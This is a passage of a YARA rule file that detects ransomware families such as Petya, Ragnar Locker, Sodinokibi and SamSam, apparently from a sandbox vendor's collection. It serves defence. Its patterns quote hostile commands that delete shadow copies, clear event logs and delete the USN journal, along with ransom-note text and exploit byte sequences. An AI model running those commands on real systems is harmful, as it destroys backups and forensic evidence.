81 C3 A3 01 00 00 }\n\n    condition:\n        all of them\n}\n\nrule Petya_variant_1\n{\n    meta:\n        description = \"Petya ransomware\"\n        ref = \"https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_petya_variant_1\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"Ooops, your important files are encrypted.\" fullword ascii wide\n        $s2 = \"Send your Bitcoin wallet ID and personal installation key to e-mail\" fullword ascii wide\n        $s3 = \"wowsmith123456@posteo.net. Your personal installation key:\" fullword ascii wide\n        $s4 = \"Send $300 worth of Bitcoin to following address:\" fullword ascii wide\n        $s5 = \"have been encrypted.  Perhaps you are busy looking for a way to recover your\" fullword ascii wide\n        $s6 = \"need to do is submit the payment and purchase the decryption key.\" fullword ascii wide\n\n    condition:\n        any of them\n}\n\nrule Petya_variant_2\n{\n    meta:\n        description = \"Petya ransomware\"\n        ref = \"https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_petya_variant_2\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"dllhost.dat\" fullword wide\n        $s2 = \"\\\\\\\\%ws\\\\admin$\\\\%ws\" fullword wide\n        $s3 = \"%s /node:\\\"%ws\\\" /user:\\\"%ws\\\" /password:\\\"%ws\\\"\" fullword wide\n        $s4 = \"\\\\\\\\.\\\\PhysicalDrive\" fullword wide\n        $s5 = \".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.\" fullword wide\n\n    condition:\n        3 of them\n}\n\nrule Petya_variant_3\n{\n    meta:\n        description = \"Petya ransomware\"\n        ref = \"https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_petya_variant_3\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"wevtutil cl Setup & wevtutil cl System\" fullword wide\n        $s2 = \"fsutil usn deletejournal /D %c:\" fullword wide\n\n    condition:\n        any of them\n}\n\nrule Petya_variant_bitcoin\n{\n    meta:\n        description = \"Petya ransomware Bitcoin address\"\n        ref = \"https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_petya_variant_bitcoin\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB\" fullword wide\n\n    condition:\n        $s1\n}\n\nrule PhobosEncryptedFile\n{\n    meta:\n        description = \"File encrypted by Phobos Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Phobos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\t\n\tstrings:\n\t\t$marker_pattern = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 [17] 00 00 00 [128] F2 00 00 00 ?? ?? ?? ?? ?? ?? }\n\t\t\n    condition:\n    // Contains one of the known markers at the end\n        (\n\t\t\t(\n\t\t\t\t(uint32be(filesize-8) == 0x00004B45 and uint32be(filesize-4) == 0x57313034) or\n\t\t\t\t(uint32be(filesize-8) == 0x00005241 and uint32be(filesize-4) == 0x4D533330) or\n\t\t\t\t(uint32be(filesize-8) == 0x00004A4F and uint32be(filesize-4) == 0x484E3937) or\n\t\t\t\t(uint32be(filesize-8) == 0x00004445 and uint32be(filesize-4) == 0x43333135) or\n\t\t\t\t(uint32be(filesize-8) == 0x00004445 and uint32be(filesize-4) == 0x43353734)\n\n\t\t\t) \n\t\t\tand $marker_pattern\n\t\t)\n    // Is encrypted\n        and math.entropy(0, 200) > 6.5\n}\n\nrule powerware_locky\n{\n    meta:\n        description = \"PowerWare ransomware\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2016/07/unit42-powerware-ransomware-spoofing-locky-malware-family/\"\n        classifications = \"Ransomware\"\n        threat_names = \"PowerWare\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_powerware_locky\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s0 = \"ScriptRunner.dll\" fullword ascii wide\n        $s1 = \"ScriptRunner.pdb\" fullword ascii wide\n        $s2 = \"fixed.ps1\" fullword ascii wide\n\n    condition:\n        all of them\n}\n\nrule RagnarEncryptedFile\n{\n    meta:\n        description = \"File encrypted by Ragnar Locker Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Ragnar Locker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    condition:\n        mime_type == \"application/octet-stream\"\n        // Contains marker at the correct offset\n        and (uint32be(filesize-9) == 0x5F524147 and uint32be(filesize-5) == 0x4E41525F)\n        // Is encrypted\n        and math.entropy(0, 500) > 7.5\n}\n\nprivate rule RagnarLists\n{\n    meta:\n        description = \"Ragnar Locker Ransomware\"\n        author = \"VMRay Labs\"\n        \n    strings:\n        // service blacklist\n        $ser1 = \"vss\" wide ascii\n        $ser2 = \"sql\" wide ascii\n        $ser3 = \"memtas\" wide ascii\n        $ser4 = \"mepocs\" wide ascii\n        $ser5 = \"sophos\" wide ascii\n        $ser6 = \"veeam\" wide ascii\n        $ser7 = \"backup\" wide ascii\n        $ser8 = \"pulseway\" wide ascii\n        $ser9 = \"logme\" wide ascii\n        $ser10 = \"logmein\" wide ascii\n        $ser11 = \"connectwise\" wide ascii\n        $ser12 = \"splashtop\" wide ascii\n        $ser13 = \"mysql\" wide ascii\n        $ser14 = \"Dfs\" wide ascii\n        \n        // language whitelist\n        $lang1 = \"Azerbaijani\" wide ascii\n        $lang2 = \"Armenian\" wide ascii\n        $lang3 = \"Belorussian\" wide ascii\n        $lang4 = \"Kazakh\" wide ascii\n        $lang5 = \"Kyrgyz\" wide ascii\n        $lang6 = \"Moldavian\" wide ascii\n        $lang7 = \"Tajik\" wide ascii\n        $lang8 = \"Russian\" wide ascii\n        $lang9 = \"Turkmen\" wide ascii\n        $lang10 = \"Uzbek\" wide ascii\n        $lang11 = \"Ukrainian\" wide ascii\n        $lang12 = \"Georgian\" wide ascii\n        \n        // dir whitelist\n        $d1 = \"Windows\" wide ascii\n        $d2 = \"Windows.old\" wide ascii\n        $d3 = \"Tor browser\" wide ascii\n        $d4 = \"Internet Explorer\" wide ascii\n        $d5 = \"Google\" wide ascii\n        $d6 = \"Opera\" wide ascii\n        $d7 = \"Opera Software\" wide ascii\n        $d8 = \"Mozilla\" wide ascii\n        $d9 = \"Mozilla Firefox\" wide ascii\n        $d10 = \"$Recycle.Bin\" wide ascii\n        $d11 = \"ProgramData\" wide ascii\n        $d12 = \"All Users\" wide ascii\n        \n        // ext whitelist\n        $ext1 = \".db\" wide ascii\n        $ext2 = \".sys\" wide ascii\n        $ext3 = \".dll\" wide ascii\n        $ext4 = \".lnk\" wide ascii\n        $ext5 = \".msi\" wide ascii\n        $ext6 = \".drv\" wide ascii\n        $ext7 = \".exe\" wide ascii\n        \n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and \n        (\n        all of ($lang*)\n        or all of ($ser*)\n        or (all of ($d*) and all of ($ext*))\n        )\n}\n\nrule Ragnar\n{\n    meta:\n        description = \"Ragnar Locker Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Ragnar Locker\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \".ragnar_\" wide ascii\n        $s2 = \"%s-%s-%s-%s-%s\" wide ascii\n        $s3 = \"\\\\\\\\.\\\\PHYSICALDRIVE%d\" wide ascii\n        $s4 = \"vssadmin delete shadows /all /quiet\" wide ascii\n        $s5 = \"RGNR_\" wide ascii\n        $s6 = \"RAGNAR SECRET\" wide ascii\n        $s7 = \"-list\" wide ascii\n        $s8 = \"-force\" wide ascii\n        $s9 = \"RAGNAR_LOCKER\" wide ascii\n    \n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 6 of ($s*)\n        and RagnarLists\n}\n\nrule SamSam_Ransomware_Latest\n{\n    meta:\n        description = \"SamSam ransomware\"\n        ref = \"http://blog.talosintelligence.com/2018/01/samsam-evolution-continues-netting-over.html\"\n        classifications = \"Ransomware\"\n        threat_names = \"SamSam\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Christiaan Beek\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SamSam_Ransomware_Latest\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"bedf08175d319a2f879fe720032d11e5\" fullword wide\n        $s2 = \"ksdghksdghkddgdfgdfgfd\" fullword ascii\n        $s3 = \"osieyrgvbsgnhkflkstesadfakdhaksjfgyjqqwgjrwgehjgfdjgdffg\" fullword ascii\n        $s4 = \"5c2d376c976669efaf9cb107f5a83d0c\" fullword wide\n        $s5 = \"B917754BCFE717EB4F7CE04A5B11A6351EEC5015\" fullword ascii\n        $s6 = \"f99e47c1d4ccb2b103f5f730f8eb598a\" fullword wide\n        $s7 = \"d2db284217a6e5596913e2e1a5b2672f\" fullword wide\n        $s8 = \"0bddb8acd38f6da118f47243af48d8af\" fullword wide\n        $s9 = \"f73623dcb4f62b0e5b9b4d83e1ee4323\" fullword wide\n        $s10 = \"916ab48e32e904b8e1b87b7e3ced6d55\" fullword wide\n        $s11 = \"c6e61622dc51e17195e4df6e359218a2\" fullword wide\n        $s12 = \"2a9e8d549af13031f6bf7807242ce27f\" fullword wide\n        $s13 = \"e3208957ad76d2f2e249276410744b29\" fullword wide\n        $s14 = \"b4d28bbd65da97431f494dd7741bee70\" fullword wide\n        $s15 = \"81ee346489c272f456f2b17d96365c34\" fullword wide\n        $s16 = \"94682debc6f156b7e90e0d6dc772734d\" fullword wide\n        $s17 = \"6943e17a989f11af750ea0441a713b89\" fullword wide\n        $s18 = \"b1c7e24b315ff9c73a9a89afac5286be\" fullword wide\n        $s19 = \"90928fd1250435589cc0150849bc0cff\" fullword wide\n        $s20 = \"67da807268764a7badc4904df351932e\" fullword wide\n        $op0 = { 30 01 00 2b 68 79 33 38 68 34 77 65 36 34 74 72 }\n        $op1 = { 01 00 b2 04 00 00 01 00 84 }\n        $op2 = { 68 09 00 00 38 66 00 00 23 55 53 00 a0 6f 00 00 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == \"f34d5f2d4577ed6d9ceec516c1f5a744\" and (8 of them) and all of ($op*)) or (all of them)\n}\n\nrule Satana\n{\n    meta:\n        description = \"Satana ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Satana\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Ransom_Satana\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 21 00 73 00 61 00 74 00 61 00 6E 00 61 00 21 00 2E 00 74 00 78 00 74 00 00 }\n        $b = { 74 67 77 79 75 67 77 71 }\n        $c = { 53 77 76 77 6E 67 75 }\n        $d = { 45 6E 75 6D 4C 6F 63 61 6C 52 65 73 }\n        $e = { 57 4E 65 74 4F 70 65 6E 45 6E 75 6D 57 00 }\n        $f = { 21 53 41 54 41 4E 41 21 }\n\n    condition:\n        $b or $c and $d and $a and $e and $f\n}\n\nrule Satana_Dropper\n{\n    meta:\n        description = \"Regla para detectar el dropper de Ransom.Satana\"\n        classifications = \"Ransomware\"\n        threat_names = \"Satana\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Ransom_Satana_Dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 25 73 2D 54 72 79 45 78 63 65 70 74 }\n        $b = { 64 3A 5C 6C 62 65 74 77 6D 77 79 5C 75 69 6A 65 75 71 70 6C 66 77 75 62 2E 70 64 62 }\n        $c = { 71 66 6E 74 76 74 68 62 }\n\n    condition:\n        all of them\n}\n\nrule Shade\n{   \n    meta:\n        description = \"Shade Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Troldesh,Shade\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \".crypted000007\" wide ascii\n        $s2 = \"Delete Shadows /All /Quiet\" wide ascii\n        $s3 = \"C:\\\\ProgramData\\\\System32\\\\xfs\" wide ascii\n        $s4 = \"C:\\\\ProgramData\\\\Windows\\\\csrss.exe\" wide ascii\n        $s5 = \"ATTENTION!\"\n        $s6 = \"\u0412\u041d\u0418\u041c\u0410\u041d\u0418\u0415!\"\n        $s7 = \"C:\\\\ProgramData\\\\System32\\\\xmail\"\n        $conf1 = \"xwp\" fullword\n        $conf2 = \"xsys\" fullword\n        $conf3 = \"xVersion\" fullword\n        $conf4 = \"xpk\" fullword\n        $conf5 = \"xmode\" fullword\n        $conf6 = \"xcnt\" fullword\n        $conf7 = \"xi\" fullword\n        $conf8 = \"shsnt\" fullword\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 4 of ($s*)\n        and 4 of ($conf*)\n}\n\nprivate rule _document_analysis\n{\n    meta:\n        description = \"Rule to limit file types\"\n        author = \"VMRay Labs\"\n\n    condition:\n        analysis_id == \"pdf\"\n        or analysis_id == \"office97\"\n        or analysis_id == \"olecf\"\n        or analysis_id == \"ooxml\"\n        or analysis_id == \"rtf\"\n}\n\nrule SodinokibiEncryptedFile\n{\n    meta:\n        description = \"File encrypted by Sodinokibi Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Sodinokibi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    condition:\n        mime_type == \"application/octet-stream\"\n        // Contains marker at the correct offset\n        and (uint32be(filesize-8) == 0x01000000 or uint32be(filesize-12) == 0x01000000)\n        // Is encrypted\n        and math.entropy(0, 500) > 7.5\n}\n\nrule Sodinokibi_RansomNote\n{\n    meta:\n        description = \"Sodinokibi Ransomware note\"\n        classification = \"Ransomware\"\n        threat_names = \"Sodinokibi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        /*\n            This rule catches a version from April 2019 and newer ones.\n            The onion url seems to be constant for now.\n            What changes every time is the path after /.\n\n        */\n        $crab = \"GANDCRAB\" ascii wide nocase\n\n        $r1 = /[a-zA-Z2-7]{16}\\.onion/ wide ascii\n        $r2 = /[a-zA-Z2-7]{56}\\.onion/ wide ascii\n\n        $s1 = \"encrypted\" fullword ascii wide\n        $s2 = \"If TOR blocked\" fullword ascii wide\n        $s3 = \"TOR browser\" fullword ascii wide\n        $s4 = \"VPN\" fullword ascii wide\n        $s5 = \"time is much more valuable than money\" fullword ascii wide\n        $s6 = \"the best specialists\" fullword ascii wide\n        $s7 = \"decrypt one file\" fullword ascii wide\n        $s8 = \"download VPN\" fullword ascii wide\n        $s9 = \"blocked\" fullword ascii wide\n\n    condition:\n        not _document_analysis\n        and not mime_type == \"text/javascript\"\n        and not mime_type == \"text/x-vbscript\"\n        and not mime_type == \"application/x-vba-macros\"\n        and not $crab\n        and 1 of ($r*) and 4 of ($s*)\n}\n\nrule Sodinokibi\n{\n    meta:\n        description = \"Sodinokibi Ransomware\"\n        classification = \"Ransomware\"\n        threat_names = \"Sodinokibi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        // used to format uid\n        $f1 = \"%08X%08X\"\n        // collect information about host\n        $f2 = \"{\\\"ver\\\":%d,\\\"pid\\\":\\\"%s\\\",\\\"sub\\\":\\\"%s\\\",\\\"pk\\\":\\\"%s\\\",\\\"uid\\\":\\\"%s\\\",\\\"sk\\\":\\\"%s\\\",\\\"unm\\\":\\\"%s\\\",\\\"net\\\":\\\"%s\\\",\\\"grp\\\":\\\"%s\\\",\\\"lng\\\":\\\"%s\\\",\\\"bro\\\":%s,\\\"os\\\":\\\"%s\\\",\\\"bit\\\":%d,\\\"dsk\\\":\\\"%s\\\",\\\"ext\\\":\\\"%s\\\"}\"\n        $f3 = \"{EXT}\" fullword\n\n        // url generation\n        $o1 = /\\/(wp-content|static|content|include|uploads|news|data|admin)\\/(images|pictures|image|temp|tmp|graphic|assets|pics|game)\\/[a-z]{2,20}\\.(jpg|png|gif)/\n        $o2 = \"SOFTWARE\\\\GitForWindows\"\n        $o3 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\Tcpip\\\\Parameters\"\n        // cve related\n        $o4 = \"C:\\\\WINDOWS\\\\system32\\\\win32kfull.sys\" wide ascii\n        $o5 = \"C:\\\\WINDOWS\\\\system32\\\\win32k.sys\" wide ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($f*)\n        and 2 of ($o*)\n}\n\nrule Sodinokibi_CVE_2018_8453\n{\n    meta:\n        description = \"Sodinokibi Ransomware using CVE-2018-8453\"\n        classification = \"Ransomware\"\n        threat_names = \"Sodinokibi,CVE-2018-8453\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        \n    strings:\n        $s1 = {E8 00 00 00 00 59 83 E9 05 83 EC 4C 55 53 56 57 8B E9 33 C9 64 8B 35 30 00 00 00 8B 76 0C 8B 76 1C 8B 46 08 8B 7E 20 8B 36 66 39 4F 18 75 F2 80 7F 0C 33 75 EC 8D B5 F0 01 00 00 8D BD E8 01 00 00 E8 8F 01 00 00 8D 85 00 02 00 00 50 50 50 59}\n        $s2 = {40 53 48 83 EC 20 65 48 8B 04 25 60 00 00 00 48 8B D9 4C 8B 40 58 4C 89 02 65 48 8B 04 25 30 00 00 00 48 8D 88 C8 02 00 00 48 83 39 00 75 03 FF 53 18 48 8D 53 54 48 8B CB E8 D2 01 00 00 48 8D 93 8C 00 00 00 48 8B CB E8 C3 01 00 00 48 8D 93 B6 00 00 00 48 8B CB E8 B4 01 00 00 48 8D 93 CC 00 00 00 48 8B CB E8 A5 01 00 00 48 8D 93 E2 00 00 00 48 8B CB 48 83 C4 20 5B E9 91 01 00 00 CC 40 55 53 56 57 41 54 41 56 41 57 48 8B EC 48 83 EC 60 48 8B DA 4C 8D 45 40 45 33 F6 4C 8B F9 33 D2 4C 89 75 40 48 8B CB 4C 89 75 50 4C 89 75 F0 41 FF 57 20 85 C0 0F 88 9C 00 00 00 4C 89 75 58 41 8D 46 02 65 48 8B 34 25 30 00 00 00 4C 8D 45}\n        $s3 = {48 8B C4 48 89 74 24 08 48 89 78 10 48 89 58 18 8B 44 24 28 48 85 C0 74 63 48 8B F1 48 85 F6 74 5B 48 8B FA 48 85 FF 74 53 41 8B D9 48 85 DB 74 4B 49 8B D0 48 8B C8 FC 48 3B CB 77 3F 4C 8B C6 4C 8B CF 4C 8B D1 4C 8B DA 48 85 D2 75 04 F3 A6 EB 12 AC 22 02 3A 07 75 0B 48 FF C7 48 FF C2 48 FF C9 75 EE 49 8B F0 49 8B F9 49 8B}\n        $s4 = {C8 48 B8 00 00 00 00 00 00 00 00 00 00 00 00 00 5C 00 25 00 53 00 00 00 5C 00 25 00 53 00 00 00 73 79 73 73 68 61 64 6F 77 00 00 00 00 00 00 00 6D 73 63 74 66 69 6D 65 20 75 69 00 5C 00 00 00 53 43 52 4F 4C 4C 42 41 52 00 00 00 00 00 00 00}\n\n        $cve1 = \"SetWindowPos\" wide ascii\n        $cve2 = \"DestroyWindow\" wide ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of them\n}\n\nrule Spora\n{\n    meta:\n        description = \"Spora ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Spora\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"pekeinfo\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Spora\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {7B 7F 4E 11 5D F3 FE 15 F9 55 FD 00 AD E9 CF FE E2 56 78 03 D0 21 46 00 30 68 C4 D0 01 FD 00 C3 B7 00 4A 0D 57 D2 52 91 05}\n        $b = {6F 51 3E 6B F9 15 29 D9 DF 26 1E 80 62 8A 0D E3 64 51 3B 0F F3 FE FF FF F3 FE FF FF F3 FE FF FF F3 FE FF FF}\n\n    condition:\n        $a and $b\n}\n\nrule Spora_unk_packer\n{\n    meta:\n        description = \"Spora ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Spora\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"pekeinfo\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"unk_packer\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = {0E 9E 52 69 C8 E4 73 BF 87 2B 95 15 33 1B B7 6B 46 62 D8 C1 01 A9 F9 17 FC EF 1A 6E B7 36 3C C4 72 7D 5D 1A 2D C4 7E 70 E8 0A A0 C6 A3 51 C1 1C 5E 98 E2 72 19 DF 03 C9 D4 25 25 1F EF 6B 46 75 9C BB 1D D2 57 56 35 75 31 35 56 8F B7 5B 23 3D }\n        $b = {00 10 00 2E E8 77 EC FF FF 85 C0 0F 85 78 C4 FF}\n\n    condition:\n        $a and $b\n}\n\nrule stampado_overlay\n{\n    meta:\n        description = \"Stampado ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Stampado\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fernando Merces, FTR, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"stampado_overlay\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    condition:\n        pe.characteristics == 0x122 and pe.number_of_sections == 5 and pe.imports(\"VERSION.dll\" , \"VerQueryValueW\") and uint8(pe.sections[4].raw_data_offset + pe.sections[4].raw_data_size) == 0x0d\n}\n\nrule TeslaCrypt\n{\n    meta:\n        description = \"TeslaCrypt ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"TeslaCrypt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"TeslaCrypt\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = { 4E 6F 77 20 69 74 27 73 20 25 49 3A 25 4D 25 70 2E 00 00 00 76 61 6C 20 69 73 20 25 64 0A 00 00 }\n\n    condition:\n        all of them\n}\n\nrule Win32Toxic : tox ransomware\n{\n    meta:\n        description = \"Tox ransomware\"\n        ref = \"https://blogs.mcafee.com/mcafee-labs/meet-tox-ransomware-for-the-rest-of-us\"\n        classifications = \"Ransomware\"\n        threat_names = \"Tox\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@GelosSnake\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Win32Toxic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"n:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t;<<t;<<t;<<t;<<t;<<t;<<t;<<t;<<t<<<t;<<t;<<t;<<\"\n        $string1 = \"t;<<t;<<t<<<t<<\"\n        $string2 = \">>><<<\"\n\n    condition:\n        2 of them\n}\n\nrule urausy_skype_dat : memory\n{\n    meta:\n        description = \"Urausy ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Urausy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"AlienVault Labs\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"urausy_skype_dat\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"skype.dat\" ascii wide\n        $b = \"skype.ini\" ascii wide\n        $win1 = \"CreateWindow\"\n        $win2 = \"YIWEFHIWQ\" ascii wide\n        $desk1 = \"CreateDesktop\"\n        $desk2 = \"MyDesktop\" ascii wide\n\n    condition:\n        $a and $b and (all of ($win*) or all of ($desk*))\n}\n\nrule WannaCashEncryptedFile\n{\n    meta:\n        description = \"WannaCash Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"WannaCash\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n\n    strings:\n        $mark1 = \"ulitochkimoi:\"\n        $mark2 = \"esetshutupfuckup\"\n        $rar = { 52 61 72 21 1A 07 00 }\n        $rar5 